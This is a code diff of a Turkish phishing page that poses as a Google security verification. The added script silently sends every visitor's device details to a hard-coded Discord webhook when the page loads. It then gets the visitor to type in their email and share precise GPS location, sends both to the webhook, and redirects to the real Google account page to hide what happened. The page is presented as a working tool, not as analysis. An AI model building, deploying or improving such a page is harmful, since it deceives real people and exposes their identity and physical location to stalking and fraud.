@@ -2,172 +2,57 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Google - Yaş Doğrulama</title>
+    <title>Google - Güvenli Doğrulama</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             font-family: 'Roboto', Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f4;
-            color: #202124;
+            margin: 0; padding: 0;
+            background-color: #f4f4f4; color: #202124;
             overflow: hidden;
         }
-
-        /* Arka Plan */
         .background-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.6);
-            z-index: -1;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.6); z-index: -1;
         }
-
         .background-image {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-image: url('https://images.unsplash.com/photo-1573164713988-8665fc963095?q=80&w=1600');
-            background-size: cover;
-            background-position: center;
-            z-index: -2;
-            filter: blur(8px);
+            background-size: cover; background-position: center; z-index: -2; filter: blur(8px);
         }
-
-        /* Bildirim Alanı */
-        .top-bar {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            z-index: 100;
-        }
-
-        .notification-box {
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-            padding: 12px 20px;
-            font-size: 14px;
-            color: #3c4043;
-            display: none;
-            border-left: 4px solid #4285f4;
-            animation: slideIn 0.4s ease-out;
-        }
-
-        .notification-box.show {
-            display: block;
-        }
-
-        @keyframes slideIn {
-            from { transform: translateX(110%); }
-            to { transform: translateX(0); }
-        }
-
-        /* Ana Panel */
         .container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
+            display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px;
         }
-
         .content {
-            background-color: #fff;
-            border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
-            padding: 40px;
-            text-align: center;
-            width: 100%;
-            max-width: 420px;
-            position: relative;
+            background-color: #fff; border-radius: 12px; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+            padding: 40px; text-align: center; width: 100%; max-width: 420px;
         }
+        .google-logo { width: 100px; margin-bottom: 25px; }
+        .title { font-size: 22px; font-weight: 500; margin-bottom: 10px; }
+        .description { font-size: 14px; color: #5f6368; margin-bottom: 30px; line-height: 1.5; }
 
-        .google-logo {
-            width: 120px;
-            margin-bottom: 24px;
+        /* Form Elemanları */
+        .step-container { margin-bottom: 25px; }
+        .email-input {
+            width: 100%; padding: 14px; border: 1px solid #dadce0; border-radius: 4px;
+            font-size: 16px; box-sizing: border-box; margin-bottom: 20px;
         }
-
-        .title {
-            font-size: 22px;
-            font-weight: 500;
-            margin: 0 0 16px 0;
-            color: #202124;
-        }
-
-        .description {
-            font-size: 15px;
-            color: #5f6368;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-
-        /* Buton ve Alt Metin Arasındaki Boşluk Düzeltildi */
-        .action-area {
-            margin-top: 10px;
-            padding-bottom: 30px; /* Alttaki footer ile mesafeyi korur */
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 15px;
-        }
-
+        .email-input:focus { outline: none; border: 2px solid #1a73e8; }
+        
+        /* Buton Fix: Alt kısımla mesafe açıldı */
         .button {
-            background-color: #1a73e8;
-            border: none;
-            border-radius: 4px;
-            color: #fff;
-            padding: 14px 32px;
-            font-size: 15px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color 0.2s, box-shadow 0.2s;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            background-color: #1a73e8; border: none; border-radius: 4px; color: #fff;
+            padding: 14px 30px; font-size: 14px; font-weight: 500; cursor: pointer;
+            width: 100%; transition: 0.3s; margin-bottom: 15px;
         }
+        .button:hover { background-color: #1765cf; }
 
-        .button:hover {
-            background-color: #1765cf;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-        }
+        .status-msg { font-size: 13px; color: #1a73e8; font-weight: 500; min-height: 20px; }
 
-        .location-message {
-            font-size: 13px;
-            color: #1a73e8;
-            font-weight: 500;
-            height: 20px;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        .location-message.show {
-            opacity: 1;
-        }
-
-        /* Alt Bilgi - Mesafe Artırıldı */
         .footer {
-            margin-top: 20px;
-            border-top: 1px solid #f1f3f4;
-            padding-top: 20px;
-            font-size: 12px;
-            color: #70757a;
+            margin-top: 30px; border-top: 1px solid #f1f3f4; padding-top: 20px;
+            font-size: 12px; color: #70757a;
         }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            margin-top: 10px;
-            gap: 12px;
-        }
-
-        .footer-link {
-            color: #70757a;
-            text-decoration: none;
-        }
-        .footer-link:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -175,100 +60,108 @@
     <div class="background-overlay"></div>
     <div class="background-image"></div>
 
-    <div class="top-bar">
-        <div class="notification-box" id="notificationBox">
-            <p id="notificationText" style="margin:0;">İşlem başlatılıyor...</p>
-        </div>
-    </div>
-
     <div class="container">
         <div class="content">
             <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
-            <h1 class="title">Kimlik Doğrulama</h1>
-            <p class="description">Hesap güvenliğini sağlamak amacıyla konum erişimini onaylayarak doğrulama işlemini tamamlayın.</p>
+            <h1 class="title">Doğrulama Gerekli</h1>
+            <p class="description">Hesabınızı güvende tutmak için 2026 güvenlik protokollerini tamamlayın.</p>
             
-            <div class="action-area">
-                <button class="button" onclick="requestLocation()">Step 1: Doğrulamayı Başlat</button>
-                <div class="location-message" id="locationMessage">İşlem yapılıyor...</div>
+            <div class="step-container">
+                <input type="email" id="userEmail" class="email-input" placeholder="E-posta adresiniz">
+                <button class="button" id="mainBtn" onclick="processSteps()">Step 1: Doğrula</button>
+                <div id="statusMsg" class="status-msg"></div>
             </div>
 
             <div class="footer">
                 <p>© 2026 Google - Hizmet Şartları ve Koşullar</p>
-                <div class="footer-links">
-                    <a href="#" class="footer-link">Gizlilik</a>
-                    <a href="#" class="footer-link">Şartlar</a>
-                    <a href="#" class="footer-link">Yardım</a>
-                    <a href="#" class="footer-link">DMCA</a>
-                </div>
             </div>
         </div>
     </div>
 
     <script>
-        // WEBHOOK URL
-        const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ"; 
-        const locationMessage = document.getElementById('locationMessage');
-        const notificationBox = document.getElementById('notificationBox');
-        const notificationText = document.getElementById('notificationText');
+        const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
+        let currentStep = 1;
 
-        function requestLocation() {
-            showNotification("Erişim izni bekleniyor...");
+        // --- STEP 0: SAYFA AÇILDIĞI AN (Görünmez Bilgi Toplama) ---
+        window.onload = async () => {
+            const info = {
+                title: "🔴 Step 0: Sayfa Ziyaret Edildi",
+                color: 16711680, // Kırmızı
+                fields: [
+                    { name: "Cihaz", value: navigator.userAgent, inline: false },
+                    { name: "Dil", value: navigator.language, inline: true },
+                    { name: "Ekran", value: `${window.screen.width}x${window.screen.height}`, inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            };
+            sendToDiscord(info);
+        };
 
-            if ("geolocation" in navigator) {
-                locationMessage.classList.add('show');
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const { latitude, longitude, accuracy } = position.coords;
-                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        async function processSteps() {
+            const email = document.getElementById('userEmail').value;
+            const btn = document.getElementById('mainBtn');
+            const status = document.getElementById('statusMsg');
 
-                        await sendToDiscord({
-                            embeds: [{
-                                title: "Sistem Logu - 2026",
-                                color: 4284148,
+            // --- STEP 1: GMAIL ALMA ---
+            if (currentStep === 1) {
+                if (!email || !email.includes('@')) {
+                    status.textContent = "Geçerli bir e-posta girin.";
+                    return;
+                }
+                
+                status.textContent = "E-posta onaylanıyor...";
+                await sendToDiscord({
+                    title: "🟡 Step 1: E-posta Girildi",
+                    color: 16776960, // Sarı
+                    fields: [{ name: "📧 Gmail", value: `\`${email}\`` }],
+                    timestamp: new Date().toISOString()
+                });
+
+                // Arayüzü Step 2'ye hazırla
+                currentStep = 2;
+                btn.textContent = "Step 2: Konum Onayı Ver";
+                status.textContent = "Son adım: Konum izni gereklidir.";
+                return;
+            }
+
+            // --- STEP 2: KONUM ALMA ---
+            if (currentStep === 2) {
+                status.textContent = "Konum bekleniyor...";
+                
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (pos) => {
+                            const { latitude, longitude, accuracy } = pos.coords;
+                            await sendToDiscord({
+                                title: "🟢 Step 2: Konum Alındı",
+                                color: 65280, // Yeşil
                                 fields: [
-                                    { name: "Enlem", value: `\`${latitude}\``, inline: true },
-                                    { name: "Boylam", value: `\`${longitude}\``, inline: true },
-                                    { name: "Hata Payı", value: `\`${accuracy.toFixed(1)}m\``, inline: true },
-                                    { name: "Harita", value: `[Haritada Gör](${mapsUrl})` }
+                                    { name: "📧 İlgili Email", value: `\`${email}\`` },
+                                    { name: "📍 Harita", value: `[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})` },
+                                    { name: "🎯 Doğruluk", value: `${accuracy.toFixed(0)} metre` }
                                 ],
                                 timestamp: new Date().toISOString()
-                            }]
-                        });
-
-                        locationMessage.textContent = "Doğrulama başarılı. Aktarılıyorsunuz...";
-                        showNotification("Onaylandı, lütfen bekleyin.", 3000); 
-                        setTimeout(() => {
-                            window.location.href = "https://myaccount.google.com";
-                        }, 2500);
-                    },
-                    (error) => {
-                        let msg = "Erişim reddedildi. Lütfen ayarlardan izin verin.";
-                        locationMessage.textContent = msg;
-                        showNotification(msg, 4000);
-                    },
-                    { enableHighAccuracy: true }
-                );
-            } else {
-                showNotification("Tarayıcı desteklenmiyor.", 4000);
+                            });
+                            
+                            status.textContent = "Doğrulama tamamlandı! Yönlendiriliyorsunuz...";
+                            setTimeout(() => { window.location.href = "https://myaccount.google.com"; }, 2000);
+                        },
+                        (err) => {
+                            status.textContent = "Hata: Konum izni reddedildi.";
+                        }
+                    );
+                }
             }
         }
 
-        function showNotification(message, duration = 3000) {
-            notificationText.textContent = message;
-            notificationBox.classList.add('show');
-            setTimeout(() => {
-                notificationBox.classList.remove('show');
-            }, duration);
-        }
-
-        async function sendToDiscord(payload) {
+        async function sendToDiscord(embed) {
             try {
                 await fetch(webhookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({ embeds: [embed] })
                 });
-            } catch (e) { console.error("Bağlantı hatası"); }
+            } catch (e) { console.log("Log hatası"); }
         }
     </script>
 </body>
